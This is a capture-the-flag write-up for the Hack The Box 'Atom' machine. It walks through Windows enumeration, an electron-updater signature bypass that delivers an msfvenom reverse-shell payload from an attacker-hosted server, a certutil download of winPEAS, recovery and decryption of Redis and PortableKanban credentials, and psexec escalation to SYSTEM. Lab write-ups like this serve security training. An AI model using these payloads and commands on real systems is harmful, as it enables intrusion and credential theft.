This is the writeup for the Atom box from the Hack The Box.

# Reconnaissance

First, we execute a full port scan on the host, and then we execute a port scan only on the open ports.

```bash
sudo nmap -v -sS -Pn -p- --min-rate 300 --max-rate 500 10.10.10.237
sudo nmap -vv -A -Pn -p 80,135,443,445,5985,6379,7680 -oA nmap/atom 10.10.10.237
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/58ea9ec4-51e7-468a-bcff-7c44d473a81c/Untitled.png)

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1fcc9f75-e532-42fb-9bbd-8cf444c3d7d1/Untitled.png)

# Enumeration

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom]
└──╼ [★]$ gobuster dir -e -u "http://atom.htb/" -w "/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt" -t 50 -x .yml,.php -o gobuster/atom_root.out
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b62dabe2-cec2-4929-9f60-49e96b7ba631/Untitled.png)

## SMB

## Crackmaexec

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation]
└──╼ [★]$ crackmapexec smb 10.10.10.237
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3bebc596-0c46-4cd2-b412-afd6cea20893/Untitled.png)

## smbclient

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom]
└──╼ [★]$ smbclient -L [//10.10.10.237](notion://10.10.10.237/) -N
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8bf72af6-c5f4-4062-96ff-74cef8b9cb67/Untitled.png)

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom]
└──╼ [★]$ smbclient [//10.10.10.237/Software_Updates](notion://10.10.10.237/Software_Updates) -N
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0e86e14d-7ba3-4d97-96a5-90240949b6c1/Untitled.png)

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom]
└──╼ [★]$ smbclient [//10.10.10.237/Software_Updates](notion://10.10.10.237/Software_Updates) -N
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7a97b466-7c25-419b-a63f-e48c12d2a32a/Untitled.png)

There's a file "UAT_Testing_Procedures.pdf" that contains some instructions to update the app

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da279bba-b36b-45ea-a008-64d19d5f7ac1/Untitled.png)

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a536da7e-929d-4a64-a39e-ad7230ffd808/Untitled.png)

# Exploitation

## Foothold

https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html

### Payload

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation]
└──╼ [★]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.232 LPORT=443 -f exe -o "j'pfdevs.exe"
```

### Getting the sha 512 sum from our payload

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation]
└──╼ [★]$ shasum -a 512 "j'pfdevs.exe" | cut -d " " -f 1 | xxd -r -p | base64
```

### Creating file latest.yml

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation]
└──╼ [★]$ cat latest.yml
version: 1.1.1
path: http://10.10.16.232/j'pfdevs.exe
sha512: 0MBB6cz3vZzSNhGEMWAX7Pi5YO1EM7o/INBQ2nCHMJipNj2HsjYFenFXnKBa+nKR8dv8Gu5IYiTUHchSpK504Q==
```

### Put latest.yml in one of the client folders

```bash
smb: \client1\> put latest.yml
putting file latest.yml as \client1\latest.yml (0.2 kb/s) (average 0.2 kb/s)
```

### Open a http server with python3 in order to get our payload with '

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation]
└──╼ [★]$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ([http://0.0.0.0:80/](http://0.0.0.0/)) ...
10.10.10.237 - - [01/Jul/2021 18:48:43] code 404, message File not found
10.10.10.237 - - [01/Jul/2021 18:48:43] "GET /j'pfdevs.exe.blockmap HTTP/1.1" 404 -
10.10.10.237 - - [01/Jul/2021 18:48:44] "GET /j%27pfdevs.exe HTTP/1.1" 200 -
```

### Getting a reverse shell

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation]
└──╼ [★]$ nc -vnlp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.237.
Ncat: Connection from 10.10.10.237:64360.
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
atom\jason
```

# Privilege Escalation

### winPEAS.exe

```bash
C:\Users\jason\Downloads>certutil.exe -urlcache -f http://10.10.16.232:8000/winPEAS.exe winPEAS.exe
certutil.exe -urlcache -f http://10.10.16.232:8000/winPEAS.exe winPEAS.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

## Services Information

```bash
[+] Interesting Services -non Microsoft-
[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#servi
ces
Apache2.4(Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Auto - Running
Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
```

```bash
Redis(Redis)["C:\\Program Files\\Redis\\redis-server.exe" --service-run "C:\\Program Files\\Redis\\redis.windows-service.conf"] - Auto - Running
This service runs the Redis server

```

=================================================================================================

```bash
ssh-agent(OpenSSH Authentication Agent)[C:\\WINDOWS\\System32\\OpenSSH\\ssh-agent.exe] - Disabled - Stopped
Agent to hold private keys used for public key authentication.

```

=================================================================================================

```bash
VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe"] - Auto - Running
Alias Manager and Ticket Service

```

=================================================================================================

```bash
C:\Users\jason\Downloads>type "C:\Program Files\Redis\redis.windows-service.conf"
type "C:\Program Files\Redis\redis.windows-service.conf"

Redis configuration file example
requirepass kidvscat_yes_kidvscat
```

## Redis (port: 6379)

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom]
└──╼ [★]$ redis-cli -h 10.10.10.237 -a 'kidvscat_yes_kidvscat'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.10.237:6379>
```

```bash
10.10.10.237:6379> select 0
OK
10.10.10.237:6379> keys *

"pk:ids:User"
"pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
"pk:ids:MetaDataClass"
"pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"
10.10.10.237:6379> get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"

```

## PortableKanBan

PortableKanban.cfg

```bash
C:\Users\jason\Downloads\PortableKanban>type PortableKanban.cfg
type PortableKanban.cfg
{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"","DbPort2":6379,"DbEncPassword2":"","DbIndex":0,"DbSsl":false,"DbTimeout":10,"FlushChanges":true,"UpdateInterval":5,"AutoUpdate":true,"Caption":"My Tasks","RightClickAction":"Nothing","DateTimeFormat":"ddd, M/d/yyyy h:mm tt","BoardForeColor":"WhiteSmoke","BoardBackColor":"DimGray","ViewTabsFont":"Segoe UI, 9pt","SelectedViewTabForeColor":"WhiteSmoke","SelectedViewTabBackColor":"Black","HeaderFont":"Segoe UI, 11.4pt","HeaderShowCount":true,"HeaderShowLimit":true,"HeaderShowEstimates":true,"HeaderShowPoints":false,"HeaderForeColor":"WhiteSmoke","HeaderBackColor":"Gray","CardFont":"Segoe UI, 11.4pt","CardLines":3,"CardTextAlignment":"Center","CardShowMarks":true,"CardShowInitials":false,"CardShowTags":true,"ThickTags":false,"DefaultTaskForeColor":"WhiteSmoke","DefaultTaskBackColor":"Gray","SelectedTaskForeColor":"WhiteSmoke","SelectedTaskBackColor":"Black","SelectedTaskFrames":false,"SelectedTaskFrameColor":"WhiteSmoke","SelectedTaskThickFrames":false,"WarmTasksThreshold":0,"WarmTaskForeColor":"WhiteSmoke","WarmTaskBackColor":"MediumBlue","WarmTaskFrameColor":"Goldenrod","HotTasksThreshold":1,"HotTaskForeColor":"WhiteSmoke","HotTaskBackColor":"Blue","HotTaskFrameColor":"Yellow","OverdueTaskForeColor":"WhiteSmoke","OverdueTaskBackColor":"OrangeRed","OverdueTaskFrameColor":"OrangeRed","WarmHotTaskFrames":false,"WarmHotTaskThickFrames":false,"BusinessDaysOnly":false,"TrackedTaskForeColor":"WhiteSmoke","TrackedTaskBackColor":"Red","ShowSubtasksInEditBox":true,"CheckForDuplicates":true,"WarnBeforeDeleting":true,"ProgressIncrement":5,"DisableCreated":false,"DefaultPriority":"Low","DefaultDeadlineTime":"PT0S","ShowTaskComments":true,"IntervalFormat":"Hours","WorkUnitDuration":1,"SelectAnyColumn":false,"ShowInfo":true,"CardInfoFont":"Segoe UI, 9pt","InfoTextAlignment":"Center","InfoShowPriority":true,"InfoShowTopic":true,"InfoShowPerson":true,"InfoShowCreated":true,"InfoShowDeadlineCompleted":true,"InfoShowSubtasks":false,"InfoShowEstimate":false,"InfoShowSpent":false,"InfoShowPoints":false,"InfoShowProgress":true,"InfoShowCommentsCount":false,"InfoShowTags":false,"InfoShowCustomFields":false,"ShowToolTips":true,"ToolTipShowText":true,"ToolTipTextLimit":200,"ToolTipShowPriority":true,"ToolTipShowTopic":true,"ToolTipShowPerson":true,"ToolTipShowCreated":false,"ToolTipShowDeadlineCompleted":true,"ToolTipShowSubtasks":true,"ToolTipShowEstimate":true,"ToolTipShowSpent":true,"ToolTipShowPoints":true,"ToolTipShowProgress":true,"ToolTipShowCommentsCount":false,"ToolTipShowTags":false,"ToolTipShowCustomFields":false,"TimerWorkInterval":25,"TimeShortBreakInterval":5,"TimerLongBreakInterval":15,"PlaySound":1000,"ActivateWindow":false,"TaskBarProgress":true,"EnableTimeTracking":true,"AlertOnNewTask":false,"AlertOnModifiedTask":false,"AlertOnCompletedTask":false,"AlertOnCanceledTask":false,"AlertOnReassignedTask":false,"AlertOnMovedTask":false,"AlertOnDeletedTask":false,"AlertMethod":"None","EmailLogon":true,"EmailReviewMessage":true,"EmailSmtpPort":587,"EmailSmtpDeliveryMethod":"Network","EmailSmtpUseDefaultCredentials":false,"EmailSmtpEnableSSL":false,"EmailSmtpTimeout":5,"EmailAttachFile":true,"EmailNewTaskSubject":"PortableKanban Notification: New task has been created","EmailDeletedTaskSubject":"PortableKanban Notification: Task has been deleted","EmailEditedTaskSubject":"PortableKanban Notification: Task has been modified","EmailCompletedTaskSubject":"PortableKanban Notification: Task has been completed","EmailCanceledTaskSubject":"PortableKanban Notification: Task has been canceled","EmailReassignedTaskSubject":"PortableKanban Notification: Task has been reassigned","EmailMovedTaskSubject":"PortableKanban Notification: Task has been moved","EmailSignature":"This is automatic message.","PluginsSettings":{"bd5d2026e1f7424eab8690a62ad05ad2":{},"07a0d797c97c41f789af21ff4298754e":{"SourceColumnId":"00000000000000000000000000000000","DestinationColumnId":"00000000000000000000000000000000","Age":30},"2e470c79feb946f2b6e74b35245f8e80":{"FromDate":"\/Date(1617346800000-0700)\/","ToDate":"\/Date(1617346800000-0700)\/","IncludeTopics":false,"IncludeTags":false,"IncludeComments":false,"ReportType":"Html","SortByUser":true},"680986568fed41c381ef9f230feaa102":{"RunOnStartup":false},"24b7acead7984f8ab16bdb0ae8559fb6":{"TopicId":"00000000000000000000000000000000","ColumnId":"00000000000000000000000000000000","FromPersonId":"00000000000000000000000000000000","ToPersonId":"00000000000000000000000000000000"}},"AutoLogon":false,"LogonUserName":"","EncLogonPassword":"","ExitOnSuspend":false,"DropFilesFolder":"Files","UseRelativePath":true,"ConfirmFileDeleteion":true,"DefaultDropFilesActionOption":"Copy","CreateNewTaskForEachDroppedFile":true,"ParseDroppedEmails":true,"RestoreWindowsLocation":true,"DesktopShortcut":false,"DailyBackup":false,"BackupTime":"PT0S","BlockEscape":false,"BlackWhiteIcon":true,"ShowTimer":true,"ViewId":"00000000000000000000000000000000","SearchInSubtasks":false,"ReportIncludeComments":true,"ReportIncludeSubTasks":true,"ReportIncludeTimeTracks":true,"ReportIncludeCustomFields":true},"LocalSettingsMap":{"ATOM":{"Left":320,"Top":2,"Width":800,"Height":601,"Minimized":false,"Maximized":false,"FullScreen":false,"Hidden":false,"AboutBoxLeft":0,"AboutBoxTop":0,"AboutBoxWidth":0,"AboutBoxHeight":0,"EditBoxLeft":0,"EditBoxTop":0,"EditBoxWidth":0,"EditBoxHeight":0,"EditBoxSplitterOrientation":1,"EditBoxSplitterDistance":0,"EditBoxFontSize":0,"EditBoxCommentsSortDirection":"Ascending","ReportBoxLeft":370,"ReportBoxTop":27,"ReportBoxWidth":700,"ReportBoxHeight":551,"SetupBoxLeft":370,"SetupBoxTop":52,"SetupBoxWidth":700,"SetupBoxHeight":501,"ViewBoxLeft":0,"ViewBoxTop":0,"ViewBoxWidth":0,"ViewBoxHeight":0,"LogonBoxLeft":520,"LogonBoxTop":202,"LogonBoxWidth":400,"LogonBoxHeight":201}}}
```

## Exploit

### PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval

https://www.exploit-db.com/exploits/49409

### Decrypting pass

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation/privesc]
└──╼ [★]$ python3 [portablekanban-enc-pass-retrv.py](http://portablekanban-enc-pass-retrv.py/)
Enter the Hash : Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
Decrypted Password : kidvscat_admin_@123
```

## Crackmapexec with creds

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation/privesc]
└──╼ [★]$ crackmapexec smb 10.10.10.237 -u Administrator -p 'kidvscat_admin_@123'
SMB         10.10.10.237    445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
SMB         10.10.10.237    445    ATOM             [+] ATOM\Administrator:kidvscat_admin_@123 (Pwn3d!)
```

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/caad1fdb-b51b-41ec-abac-fd3a267f4cdd/Untitled.png)

## psexec.py

```bash
─[us-dedivip-1]─[10.10.16.232]─[th3g3ntl3m4n@ctf]─[~/htb/Atom/exploitation/privesc]
└──╼ [★]$ /opt/impacket/build/scripts-3.9/psexec.py Administrator:'kidvscat_admin_@123'@10.10.10.237
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.237.....
[*] Found writable share ADMIN$
[*] Uploading file NyGmXfQw.exe
[*] Opening SVCManager on 10.10.10.237.....
[*] Creating service JJNQ on 10.10.10.237.....
[*] Starting service JJNQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

# Credentials

Administrator:kidvscat_admin_@123

![](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ecfc6dbf-0204-49ce-b5cc-a9465e990403/Untitled.png)